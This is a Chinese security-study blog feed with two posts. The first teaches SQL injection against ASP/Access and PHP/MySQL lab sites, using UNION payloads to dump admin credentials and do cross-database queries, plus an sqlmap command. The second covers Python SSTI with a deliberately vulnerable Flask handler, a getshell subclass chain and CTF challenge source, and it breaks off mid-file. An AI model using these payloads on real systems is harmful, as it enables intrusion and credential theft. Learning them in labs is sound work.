        <content type="html"><![CDATA[<h1 id="SQL注入-数据库注入"><a href="#SQL注入-数据库注入" class="headerlink" title="SQL注入(数据库注入)"></a>SQL注入(数据库注入)</h1><p>➢ASP+Access-简易注入-字典猜解<br>➢ASP+Access-偏移注入-报错显示<br>➢PHP+MYSQL-简易注入-存储特性<br>➢PHP+MYSQL-跨库注入-权限属性</p><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><blockquote><p>SQL注入漏洞产生原理分析<br>SQL注入漏洞危害利用分析<br>脚本代码与数据库操作流程<br>数据库名，表名，列名，数据<br>数据库类型，数据库用户，用户权限</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p><strong>定义</strong> ：脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。<br>其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。<br>这一个过程就可以叫做SQL注入漏洞。<br>简单来说，根据代码逻辑存在的问题，使用自定义的sql语句去随便查查数据。<br><strong>危害</strong> : 获取管理员的账户密码，操作数据库内的数据。</p></blockquote><p>sql语句是查询操作，不能乱写。</p><h2 id="漏洞产生根本条件：可控变量-特定函数"><a href="#漏洞产生根本条件：可控变量-特定函数" class="headerlink" title="漏洞产生根本条件：可控变量 特定函数"></a>漏洞产生根本条件：可控变量 特定函数</h2><p>操作变量和特定函数的过程中所产生的漏洞，例如无法检测语句后面是否被注释掉，产生注入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正常访问网站时：</span><br><span class="line">http:<span class="comment">//192.168.46.160:85/Production/PRODUCT.asp</span></span><br><span class="line">http:<span class="comment">//192.168.46.160:85/Production/PRODUCT.asp?id=1513</span></span><br><span class="line"></span><br><span class="line">如果下面的URL地址测试注入判断id有注入，手工测试该如何进行？</span><br><span class="line">http:<span class="comment">//192.168.46.160:85/Production/PRODUCT.asp?id=1513&amp;page=1</span></span><br><span class="line">http:<span class="comment">//192.168.46.160:85/Production/PRODUCT.asp?page=1&amp;id=1513</span></span><br><span class="line"></span><br><span class="line">Production/PRODUCT.asp?id=<span class="number">1513</span> 注入语句&amp;page=<span class="number">1</span> =&gt;对 =&gt; 注入语句必须放到最后</span><br><span class="line">Production/PRODUCT.asp?id=<span class="number">1513</span>&amp;page=<span class="number">1</span> 注入语句 =&gt;错</span><br></pre></td></tr></table></figure><h2 id="SQL注入攻击流程-amp-数据库基本概念"><a href="#SQL注入攻击流程-amp-数据库基本概念" class="headerlink" title="SQL注入攻击流程&amp;数据库基本概念"></a>SQL注入攻击流程&amp;数据库基本概念</h2><p>1、猜测数据库类型<br>2、根据类型选择思路</p><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><h3 id="独立型数据库"><a href="#独立型数据库" class="headerlink" title="独立型数据库"></a>独立型数据库</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ACCESS 独立存在,简单来说可以直接塞到网站根目录，但Mysql不行。</span><br><span class="line">单独以文件形式存在，可以放在任何位置。</span><br><span class="line"></span><br><span class="line">- 数据库结构：</span><br><span class="line">      数据库名</span><br><span class="line">        表名</span><br><span class="line">            列名</span><br><span class="line">                数据</span><br></pre></td></tr></table></figure><h3 id="统管型数据库"><a href="#统管型数据库" class="headerlink" title="统管型数据库"></a>统管型数据库</h3><p>MYSQL 统一管理数据库</p><ul><li>一个连接下可以同时存在数个数据库</li><li>每个数据库相对独立，各自管理一个网站</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">最高数据库用户=root用户</span><br><span class="line">=&gt; 统一管理下，一库对应一源码，也对应不同网站</span><br><span class="line">=&gt; 一个库名一个网站--&gt;n张表--&gt;每个表n列字段m行数据</span><br><span class="line">=&gt; 如果取得MYSQL最高用户root，极有可能一次性危害所有的在这个统一管理下的网站！</span><br><span class="line">数据库A=网站A=数据库用户A</span><br><span class="line">    表名</span><br><span class="line">        列名</span><br><span class="line">            数据</span><br><span class="line"></span><br><span class="line">数据库B=网站B=数据库用户B</span><br><span class="line">数据库C=网站C=数据库用户C</span><br></pre></td></tr></table></figure><h1 id="Access-MySQL攻击"><a href="#Access-MySQL攻击" class="headerlink" title="Access+MySQL攻击"></a>Access+MySQL攻击</h1><p>➢ASP+Access-简易注入-字典猜解<br>➢ASP+Access-偏移注入-报错显示<br>➢PHP+MYSQL-简易注入-存储特性<br>➢PHP+MYSQL-跨库注入-权限属性</p><blockquote><p>为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。</p></blockquote><h2 id="ASP-Access注入"><a href="#ASP-Access注入" class="headerlink" title="ASP+Access注入"></a>ASP+Access注入</h2><ul><li>偏移注入-报错提示</li><li>简易注入-字典猜解</li></ul><h3 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h3><blockquote><p>由于Access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入！<br>总结：根据前期信息收集创建新字典，拆解表名和列名。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">源博客：</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/02SWD/p/15811580.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/u014029795/article/details/91150847</span></span><br><span class="line"></span><br><span class="line">偏移注入--<span class="number">0</span>级偏移</span><br><span class="line">?id=<span class="number">1513</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> admin</span><br><span class="line">偏移注入--<span class="number">1</span>级偏移</span><br><span class="line">?id=<span class="number">1513</span> union select top <span class="number">1</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>, * <span class="keyword">from</span> admin</span><br><span class="line">偏移注入--<span class="number">2</span>级偏移</span><br><span class="line">?id=<span class="number">1513</span> union select top <span class="number">1</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,* <span class="keyword">from</span> admin</span><br><span class="line">偏移注入--<span class="number">3</span>级偏移+字段爆破</span><br><span class="line">?id=<span class="number">1513</span> union select top <span class="number">1</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,* <span class="keyword">from</span>((admin <span class="keyword">as</span> a inner join admin <span class="keyword">as</span> b on a.id=b.id) inner join admin <span class="keyword">as</span> c on a.id=c.id)</span><br><span class="line"></span><br><span class="line">微调版payload：</span><br><span class="line">?id=<span class="number">1513</span> union select top <span class="number">1</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,b.id, * <span class="keyword">from</span> (admin a inner join admin b on a.id=b.id)</span><br></pre></td></tr></table></figure><p>表名知道但是列名不知道。 ==&gt; 都查不到，直接放弃。</p><blockquote><p>偏移注入就是解决表名已知，列名未知的情况！</p></blockquote><h3 id="报错显示"><a href="#报错显示" class="headerlink" title="报错显示"></a>报错显示</h3><p>利用报错信息拆解源码信息以及数据库相关报错信息。也可以利用源码拆解数据库的查询语句。</p><h2 id="Mysql注入攻击"><a href="#Mysql注入攻击" class="headerlink" title="Mysql注入攻击"></a>Mysql注入攻击</h2><ul><li>简易注入-存储特性</li><li>跨库注入-权限属性</li></ul><h3 id="MYSQL两种思路"><a href="#MYSQL两种思路" class="headerlink" title="MYSQL两种思路"></a>MYSQL两种思路</h3><blockquote><p>1、非ROOT的注入攻击：常规类的猜解<br>2、ROOT用户的注入攻击：文件读写操作，跨库查询注入等</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 非ROOT的注入攻击：常规类的猜解</span><br><span class="line">    mysql当中</span><br><span class="line">        - order by：直接使用xxx order by <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;也可直接查数字，测出数据表的列数极限。</span><br><span class="line">        - union: 联合查询语句，可以在后面拼接上另外依一句select进行查询</span><br><span class="line">            =&gt; id =<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> admin</span><br><span class="line">            - 查询admin表名：</span><br><span class="line">                UNION select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> admin</span><br><span class="line">            - 查询admin表名下的admin等列名</span><br><span class="line">                UNION select <span class="number">1</span>,<span class="number">2</span>,admin,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span> <span class="keyword">from</span> admin</span><br><span class="line"></span><br><span class="line">黑盒测试中可以采用<span class="title function_ invoke__">user</span>()获取当前用户权限，白盒中看连接用户即可！</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> product where id=<span class="number">1513</span> </span><br></pre></td></tr></table></figure><h3 id="information-schema-记录型数据库5-0"><a href="#information-schema-记录型数据库5-0" class="headerlink" title="information_schema-记录型数据库5.0"></a>information_schema-记录型数据库5.0</h3><p>MYSQL5.0以上版本：自带的数据库名information_schema,可以查询当前连接下所有的数据库相关的信息。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">举个例子：其中的TABLES表记录着所有的数据库中的表名。</span><br><span class="line">information_schema：存储数据库下的数据库名及表名，列名信息的数据库</span><br><span class="line">information_schema.tables：记录表名信息的表</span><br><span class="line">information_schema.columns：记录列名信息表</span><br><span class="line">=&gt; 注意：information_schema.tables是切换到这个数据库下的tables表的意思 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL查询获取相关数据：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、数据库版本</span><br><span class="line">    - 看是否符合information_schema查询  </span><br><span class="line">    - select <span class="title function_ invoke__">version</span>();</span><br><span class="line">        -&gt; <span class="number">5.5</span>.<span class="number">532</span></span><br><span class="line"><span class="number">2</span>、数据库用户-看是否符合ROOT型注入攻击           </span><br><span class="line">    - select <span class="title function_ invoke__">user</span>();</span><br><span class="line">        -&gt; root@localhost</span><br><span class="line"><span class="number">3</span>、当前操作系统</span><br><span class="line">    - 看是否支持大小写或文件路径选择</span><br><span class="line">    - select @@version_compile_os;</span><br><span class="line">        - win64</span><br><span class="line"><span class="number">4</span>、数据库名字</span><br><span class="line">    - 为后期猜解指定数据库下的表，列做准备（查询的是当前站点的数据库名）  </span><br><span class="line">    - select <span class="title function_ invoke__">database</span>();</span><br><span class="line">        -   syguestbook</span><br></pre></td></tr></table></figure><h3 id="基于MySQL的攻击"><a href="#基于MySQL的攻击" class="headerlink" title="基于MySQL的攻击"></a>基于MySQL的攻击</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROOT类型攻击 </span><br><span class="line">    - 猜解数据，文件读写，跨库查询</span><br><span class="line">        猜解数据:获取syguestbook数据库下面的表名信息：</span><br><span class="line">        UNION SELECT table_name,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;syguestbook&#x27;</span></span><br><span class="line"></span><br><span class="line">        获取表名sy_adminuser的列名信息：</span><br><span class="line">        UNION SELECT column_name,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;sy_adminuser&#x27;</span> <span class="keyword">and</span> table_schema=<span class="string">&#x27;syguestbook&#x27;</span></span><br><span class="line"></span><br><span class="line">        获取指定数据：</span><br><span class="line">        UNION SELECT username,password,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> sy_adminuser</span><br><span class="line"></span><br><span class="line">跨库注入：实现当前网站跨库查询其他数据库对应网站的数据</span><br><span class="line">    获取当前mysql下的所有数据库名</span><br><span class="line">    UNION SELECT schema_name,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line">    获取数据库名xhcms下的表名信息(相关库名对应的所有信息)</span><br><span class="line">    UNION SELECT table_name,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;xhcms&#x27;</span></span><br><span class="line"></span><br><span class="line">    获取数据库名xhcms下的表manage下的列名信息：(相关库名下的表)</span><br><span class="line">    UNION SELECT column_name,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;manage&#x27;</span> <span class="keyword">and</span> table_schema=<span class="string">&#x27;xhcms&#x27;</span></span><br><span class="line"></span><br><span class="line">    获取指定数据：（指定 库名.表明查出用户信息）</span><br><span class="line">    <span class="comment"># 数字被替换掉的原因：这个地方在 查找时被回显到了页面当中，所以被拿来当做输出的窗口</span></span><br><span class="line">    UNION SELECT user,password,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> xhcms.manage</span><br><span class="line"></span><br><span class="line">mysql思路</span><br><span class="line"><span class="number">1.</span>测试字段大小</span><br><span class="line">    ?<span class="built_in">id</span>=<span class="number">1</span> order by <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>完成字段测试（刚好不报错的边缘就是列数长度）后，尝试回显字段有哪些（猜测显示位）</span><br><span class="line">    ?<span class="built_in">id</span>=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> </span><br><span class="line">    =&gt; 有显示出结果的地方即是回显的一个信息点，</span><br><span class="line">    =&gt; 例如它爆出了<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>尝试替换爆出的字段</span><br><span class="line">    ?<span class="built_in">id</span>=<span class="number">1</span> union select <span class="number">1</span>,version(),<span class="number">3</span>,user(),database(),<span class="number">6</span>,<span class="number">7</span>  </span><br><span class="line">    =&gt; <span class="number">4.1</span><span class="number">.22</span>-standard csearch csearch@localhost</span><br></pre></td></tr></table></figure><h3 id="SQLMAP-base64注入"><a href="#SQLMAP-base64注入" class="headerlink" title="SQLMAP-base64注入"></a>SQLMAP-base64注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u url?id=MQ== --tamper base64encode.py –dbs</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0014-WEB攻防-05-Python/SSTI</title>
      <link href="/2023/05/14/SEC-Study-0042/"/>
      <url>/2023/05/14/SEC-Study-0042/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI所涉及的开发语言"><a href="#SSTI所涉及的开发语言" class="headerlink" title="SSTI所涉及的开发语言"></a>SSTI所涉及的开发语言</h1><p><a href="Python1.png">SSTI所涉及的语言</a></p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、PYC文件反编译<br>2、Python-Web-SSTI<br>3、SSTI模版注入利用分析</p><p>python网站识别的办法：Werkzeug(中间件)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">模板文件+数据 ==模板引擎==&gt;HTML文件</span><br><span class="line"></span><br><span class="line">模板类似于css，是一种前端显示修饰。换模板就是换一种显示样式。</span><br><span class="line"></span><br><span class="line">➢PY反编译-PYC编译文件反编译源码</span><br><span class="line">➢SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用</span><br><span class="line">➢SSTI考点-CTF靶场-[WesternCTF]shrine</span><br><span class="line">➢SSTI考点-CMS源码-MACCMS_V8.X执行</span><br></pre></td></tr></table></figure><h1 id="PY反编译-PYC编译文件反编译源码"><a href="#PY反编译-PYC编译文件反编译源码" class="headerlink" title="PY反编译-PYC编译文件反编译源码"></a>PY反编译-PYC编译文件反编译源码</h1><p>pyc文件是py文件编译后生成的字节码文件(byte code)，pyc文件经过python解释器最终会生成机器码运行。<br>因此pyc文件是可以跨平台部署的，类似Java的.class文件，一般py文件改变后，都会重新生成pyc文件。<br>反编译出py文件就是源码文件了。</p><blockquote><p>=&gt;<a href="https://tool.lu/pyc/">python在线反编译1</a><br>=&gt;<a href="http://tools.bugscaner.com/decompyle/">python在线反编译2</a><br>=&gt;<a href="https://github.com/wibiti/uncompyle2">反编译工具Python2.7</a></p></blockquote><h1 id="SSTI入门-原理-amp-分类-amp-检测-amp-分析-amp-利用"><a href="#SSTI入门-原理-amp-分类-amp-检测-amp-分析-amp-利用" class="headerlink" title="SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用"></a>SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用</h1><p>SSTI沙盒逃逸。</p><h2 id="相关漏洞代码"><a href="#相关漏洞代码" class="headerlink" title="相关漏洞代码"></a>相关漏洞代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="comment"># 访问根目录时返回</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问错误时候返回报错信息</span></span><br><span class="line"><span class="comment"># 这是访问错误时的报错处理</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其中，&lt;h3&gt;%s&lt;/h3&gt;存在变量输入，即存在变量，存在SSTI</span></span><br><span class="line"><span class="comment"># 用户的输入会被网站当成解析的一部分，导致SSTI漏洞出现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="什么是SSTI？有什么漏洞危害？"><a href="#什么是SSTI？有什么漏洞危害？" class="headerlink" title="什么是SSTI？有什么漏洞危害？"></a>什么是SSTI？有什么漏洞危害？</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web应用模板：</span><br><span class="line">    表示显示网站的样式，大概的样板，或者说是一个模型</span><br><span class="line">    但凡有个页面想使用它，直接调用即可</span><br><span class="line">    比如：我需要使用a模板的样式用于显示文章，就直接调用A模板的样式即可</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- 代码实现start ---- #</span></span><br><span class="line">    <span class="comment"># 再举个简单的例子：</span></span><br><span class="line">    <span class="comment"># 这是即将插入模板的数据</span></span><br><span class="line">    a = <span class="string">&quot;数据A&quot;</span></span><br><span class="line">    b = <span class="string">&quot;数据B&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 这是格式化的字符串，算是一个模板</span></span><br><span class="line">    <span class="comment"># 再利用print输出模板内容</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;&lt;div&gt;&#123;&#125;--&#123;&#125;&lt;/div&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line"><span class="comment"># ---- 代码实现end ---- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面代表数据能插入模板执行，也就代表着能写入攻击代码写入到模板进行执行，执行攻击</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>漏洞成因: 服务端接收了用户恶意输入以后，未经处理就将其作为 Web 模板内容进行渲染展示,执行了用户插入的可以破坏模板的语句<br>结果：导致敏感信息泄露、代码执行、GetShell 等问题。<br>其影响范围主要取决于模版引擎的复杂性。</p></blockquote><h2 id="如何判断检测SSTI漏洞的存在？"><a href="#如何判断检测SSTI漏洞的存在？" class="headerlink" title="如何判断检测SSTI漏洞的存在？"></a>如何判断检测SSTI漏洞的存在？</h2><blockquote><p>输入的数据会被浏览器利用当前脚本语言调用解析执行</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">模板漏洞检测：传入&#123;&#123;<span class="number">3</span>*<span class="number">56</span>&#125;&#125;能正常的被执行</span><br><span class="line"></span><br><span class="line"><span class="comment"># 俩括号代表是执行Python漏洞</span></span><br><span class="line"><span class="comment"># 例如上面的代码运行后：</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/asdasddasd?404_url=&#123;&#123;<span class="number">3</span>/<span class="number">1111</span>&#125;&#125;</span><br><span class="line"><span class="comment"># 返回的结果</span></span><br><span class="line">Oops! That page doesn<span class="string">&#x27;t exist.</span></span><br><span class="line"><span class="string">0.0027002700270027003</span></span><br><span class="line"><span class="string"># 会运算&#123;&#123;3/1111&#125;&#125;并且回显，证明存在SSTI，或者是模板漏洞</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">引用大佬的：</span></span><br><span class="line"><span class="string"># 注入思路</span></span><br><span class="line"><span class="string">    随便找一个内置类对象用__class__拿到他所对应的类</span></span><br><span class="line"><span class="string">    用__bases__拿到基类（&lt;class &#x27;</span><span class="built_in">object</span><span class="string">&#x27;&gt;）</span></span><br><span class="line"><span class="string">    用__subclasses__()拿到子类列表</span></span><br><span class="line"><span class="string">    在子类列表中直接寻找可以利用的类getshell</span></span><br><span class="line"><span class="string"># 下面代码放在&#123;&#123;&#125;&#125;当中</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;.__class__.__bases__[0].__subclasses__()</span></span><br><span class="line"><span class="string">().__class__.__mro__[2].__subclasses__()</span></span><br><span class="line"><span class="string">request.__class__.__mro__[1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">引用自文章：https://xz.aliyun.com/t/7746</span></span><br><span class="line"><span class="string"># 注意：Python语言版本问题会导致这个漏洞复现失败！</span></span><br></pre></td></tr></table></figure><h1 id="SSTI安全问题在生产环境那里产生"><a href="#SSTI安全问题在生产环境那里产生" class="headerlink" title="SSTI安全问题在生产环境那里产生"></a>SSTI安全问题在生产环境那里产生</h1><blockquote><p>存在模版引用的地方，如404错误页面展示<br>存在数据接收引用的地方，如模版解析获取参数数据</p></blockquote><h1 id="SSTI考点-CTF靶场-WesternCTF-shrine"><a href="#SSTI考点-CTF靶场-WesternCTF-shrine" class="headerlink" title="SSTI考点-CTF靶场-[WesternCTF]shrine"></a>SSTI考点-CTF靶场-[WesternCTF]shrine</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 